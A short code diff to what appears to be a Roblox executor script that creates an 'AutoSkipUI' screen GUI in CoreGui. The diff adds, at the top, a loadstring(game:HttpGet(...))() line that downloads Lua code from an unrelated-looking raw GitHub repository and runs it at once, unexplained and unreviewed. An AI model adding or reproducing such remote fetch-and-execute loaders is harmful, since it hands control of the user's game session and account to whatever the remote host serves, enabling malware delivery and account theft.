@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kakaTuySigma99/Reborn-toilet/refs/heads/main/tower%20defense"))()
+
 local s=Instance.new("ScreenGui",game.CoreGui)
 s.Name="AutoSkipUI"
 s.ResetOnSpawn=false
